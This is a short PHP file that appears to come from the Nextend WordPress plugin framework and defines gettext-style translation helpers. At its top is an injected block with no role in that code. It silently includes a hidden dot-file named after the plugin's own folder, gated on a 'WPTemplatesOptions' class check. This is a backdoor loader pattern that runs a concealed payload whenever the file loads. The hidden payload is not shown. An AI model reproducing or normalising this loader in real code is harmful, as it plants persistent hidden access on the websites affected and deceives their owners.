<?php

use Nextend\Framework\Localization\Localization;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

function n2_($text, $domain = 'nextend') {
    $translations = Localization::getTranslationsForDomain($domain);

    return $translations->translate($text);
}

function n2_e($text, $domain = 'nextend') {
    echo n2_($text, $domain);
}

function n2_n($single, $plural, $number, $domain = 'nextend') {
    $translations = Localization::getTranslationsForDomain($domain);

    return $translations->translate_plural($single, $plural, $number);
}

function n2_en($single, $plural, $number, $domain = 'nextend') {
    echo n2_n($single, $plural, $number, $domain);
}

function n2_x($text, $context, $domain = 'nextend') {
    $translations = Localization::getTranslationsForDomain($domain);

    return $translations->translate($text, $context);
}

function n2_ex($text, $context, $domain = 'nextend') {
    echo n2_x($text, $context, $domain);
}